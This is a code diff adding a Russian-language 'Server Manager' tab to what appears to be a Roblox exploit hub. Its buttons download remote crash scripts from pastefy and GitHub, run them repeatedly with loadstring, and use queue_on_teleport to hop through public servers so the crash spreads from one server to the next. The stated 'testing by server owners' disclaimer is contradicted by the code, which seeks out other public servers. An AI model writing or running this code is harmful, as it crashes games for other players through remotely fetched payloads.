@@ -4621,6 +4621,291 @@ do
 end
 
 -- ============================================================================
+-- ブロック31.5 [RU]: Менеджер сервера（ロシア語版）
+-- 攻撃系タブ（ブロック31）の直後に挿入
+-- ============================================================================
+do
+    local Window = _G.Window
+    local OrionLib = _G.OrionLib
+    local ReplicatedStorage = game:GetService("ReplicatedStorage")
+    local TextChatService = game:GetService("TextChatService")
+    local TeleportService = game:GetService("TeleportService")
+    local HttpService = game:GetService("HttpService")
+    local Players = game:GetService("Players")
+
+    -- ========================================================================
+    -- Константы
+    -- ========================================================================
+    local CRASH_URL     = "https://pastefy.app/sPciZuXM/raw"   -- Краш-скрипт (одиночный, 35 раз)
+    local AUTOLOGIC_URL = "https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/server-crash"  -- Бесконечный цикл
+    local CHAT_HEADER   = "SakuraHUB-by-Nuked"
+    local CRASH_LOOP_COUNT = 35
+
+    -- ========================================================================
+    -- HTTP-получение
+    -- ========================================================================
+    local function safeHttpGet(url)
+        if type(game.HttpGet) == "function" then
+            return game:HttpGet(url)
+        elseif type(HttpGet) == "function" then
+            return HttpGet(url)
+        elseif type(game.HttpGet) == "function" then
+            return game.HttpGet(game, url)
+        end
+        error("HttpGet not available in this environment")
+    end
+
+    -- ========================================================================
+    -- Отправка чата (2 способа: TextChatService + Legacy)
+    -- ========================================================================
+    local function sendChatMessage(message)
+        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+            pcall(function()
+                local gc = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+                gc:SendAsync(message)
+            end)
+        end
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local smr = events:FindFirstChild("SayMessageRequest")
+            if smr then
+                pcall(function() smr:FireServer(message, "All") end)
+            end
+        end
+    end
+
+    -- ========================================================================
+    -- Запуск краш-скрипта (одиночный, 35 раз)
+    -- ========================================================================
+    local function runCrashScript()
+        local ok, err = pcall(function()
+            local scriptContent = safeHttpGet(CRASH_URL)
+            for i = 1, CRASH_LOOP_COUNT do
+                pcall(function()
+                    loadstring(scriptContent)()
+                end)
+                task.wait(0.1)
+            end
+        end)
+        return ok, err
+    end
+
+    -- ========================================================================
+    -- Получение JobId другого сервера
+    -- ========================================================================
+    local function getAnotherServerJobId()
+        local ok, result = pcall(function()
+            local url = string.format(
+                "https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=Asc&limit=100",
+                game.PlaceId
+            )
+            return HttpService:JSONDecode(safeHttpGet(url))
+        end)
+        if ok and result and result.data then
+            local currentJobId = game.JobId
+            for _, server in ipairs(result.data) do
+                if server.id and server.id ~= currentJobId then
+                    return server.id
+                end
+            end
+        end
+        return nil
+    end
+
+    -- ========================================================================
+    -- Телепортация
+    -- ========================================================================
+    local function teleportToAnotherServer()
+        local targetJobId = getAnotherServerJobId()
+        local localPlayer = Players.LocalPlayer
+        if targetJobId then
+            local ok = pcall(function()
+                local opts = Instance.new("TeleportOptions")
+                opts.ServerInstanceId = targetJobId
+                TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
+            end)
+            if ok then return true end
+        end
+        pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
+        return false
+    end
+
+    -- ========================================================================
+    -- Обратный отсчёт (1 раз)
+    -- ========================================================================
+    local function runCountdownOnce(onFinish)
+        task.spawn(function()
+            pcall(function() sendChatMessage(CHAT_HEADER) end)
+            task.wait(0.8)
+            pcall(function() sendChatMessage("5") end) task.wait(1)
+            pcall(function() sendChatMessage("4") end) task.wait(1)
+            pcall(function() sendChatMessage("3") end) task.wait(1)
+            pcall(function() sendChatMessage("2") end) task.wait(1)
+            pcall(function() sendChatMessage("1") end)
+            if onFinish then onFinish() end
+        end)
+    end
+
+    -- ========================================================================
+    -- Проверка поддержки queue_on_teleport
+    -- ========================================================================
+    local function hasQueueOnTeleport()
+        return (type(queue_on_teleport) == "function")
+            or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
+    end
+
+    local function callQueueOnTeleport(script)
+        if type(queue_on_teleport) == "function" then
+            return pcall(function() queue_on_teleport(script) end)
+        elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+            return pcall(function() syn.queue_on_teleport(script) end)
+        end
+        return false
+    end
+
+    -- ========================================================================
+    -- Создание вкладки
+    -- ========================================================================
+    local CrashTab = Window:MakeTab({
+        Name = "Менеджер сервера",
+        Icon = "rbxassetid://4483345998",
+        PremiumOnly = false
+    })
+
+    CrashTab:AddParagraph(
+        "⚠️ Запрещено злоупотребление",
+        "Функция для тестирования владельцами сервера.\n" ..
+        "Не запускайте на чужих серверах."
+    )
+
+    CrashTab:AddSection({ Name = "Тестовый запуск" })
+
+    -- ========================================================================
+    -- ① Одиночный (тест краша)
+    --    Только запускает sPciZuXM 35 раз. Без телепортации.
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "⚡ Тест краша сервера (одиночный, 35 раз подряд)",
+        Callback = function()
+            PlayActionSound()
+            OrionLib:MakeNotification({
+                Name = "Одиночный тест краша",
+                Content = "Начинаем 35 последовательных запусков...",
+                Time = 3
+            })
+            task.spawn(function()
+                local ok, err = runCrashScript()
+                if ok then
+                    PlayActionSound()
+                    OrionLib:MakeNotification({
+                        Name = "Готово",
+                        Content = "35 запусков выполнено",
+                        Time = 5
+                    })
+                else
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Ошибка",
+                        Content = "Не удалось: " .. tostring(err),
+                        Time = 5
+                    })
+                end
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- ② Автоматический бесконечный режим
+    --    1-й запуск (этот сервер):
+    --      Отсчёт → поставить server-crash в queue_on_teleport
+    --      Запустить телепорт → выполнить sPciZuXM (35 раз) на этом сервере
+    --    2-й и последующие (новый сервер):
+    --      server-crash загружается автоматически → отсчёт·краш·телепорт·самопостановка
+    -- ========================================================================
+    CrashTab:AddButton({
+        Name = "🔁 Автоматический режим краша (бесконечный цикл)",
+        Callback = function()
+            PlayActionSound()
+
+            if not hasQueueOnTeleport() then
+                PlayErrorSound()
+                OrionLib:MakeNotification({
+                    Name = "❌ Невозможно выполнить",
+                    Content = "Этот executor не поддерживает queue_on_teleport. Бесконечный цикл невозможен.",
+                    Time = 8
+                })
+                return
+            end
+
+            OrionLib:MakeNotification({
+                Name = "🔁 Автоматический режим",
+                Content = "Начинаем отсчёт → на этом сервере тоже будет 35 запусков краша",
+                Time = 3
+            })
+
+            runCountdownOnce(function()
+                -- Поставить server-crash (только загрузку URL) для следующего сервера
+                local nextScript = string.format([[
+loadstring(game:HttpGet("%s"))()
+]], AUTOLOGIC_URL)
+                local ok = callQueueOnTeleport(nextScript)
+                if not ok then
+                    PlayErrorSound()
+                    OrionLib:MakeNotification({
+                        Name = "Ошибка",
+                        Content = "Не удалось поставить queue_on_teleport",
+                        Time = 4
+                    })
+                    return
+                end
+
+                -- Сначала запустить телепорт (чтобы не повлиял краш)
+                task.spawn(function() teleportToAnotherServer() end)
+                task.wait(0.1)
+
+                -- На этом сервере тоже выполнить sPciZuXM (35 раз)
+                task.spawn(function()
+                    local crashOk = runCrashScript()
+                    if crashOk then
+                        PlayActionSound()
+                        OrionLib:MakeNotification({
+                            Name = "Первый запуск краша",
+                            Content = "server-crash поставлен · Переход на другой сервер",
+                            Time = 4
+                        })
+                    else
+                        PlayErrorSound()
+                    end
+                end)
+            end)
+        end
+    })
+
+    -- ========================================================================
+    -- Информация
+    -- ========================================================================
+    CrashTab:AddSection({ Name = "Информация" })
+    CrashTab:AddParagraph(
+        "Использование",
+        "① Одиночный: запуск sPciZuXM 35 раз (завершается на этом сервере)\n" ..
+        "② Автоматический бесконечный: отсчёт → постановка server-crash → запуск телепорта → 35 запусков краша на этом сервере\n" ..
+        "   После прибытия на новый сервер server-crash автоматически выполнит отсчёт·краш·телепорт·самопостановку,\n" ..
+        "   создавая бесконечный цикл."
+    )
+    CrashTab:AddParagraph(
+        "Используемые URL",
+        "・Одиночный краш: " .. CRASH_URL .. "\n" ..
+        "・Бесконечный: " .. AUTOLOGIC_URL
+    )
+    CrashTab:AddParagraph(
+        "Внимание",
+        "・Executor без queue_on_teleport не сможет запустить бесконечный цикл\n" ..
+        "・При отсутствии публичных серверов используется резервный Teleport()\n" ..
+        "・Непрерывная телепортация + краш нарушает правила Roblox (на свой риск)"
+    )
+end
+
+-- ============================================================================
 -- Блок 32: Вкладка захвата поезда
 -- ============================================================================
 do
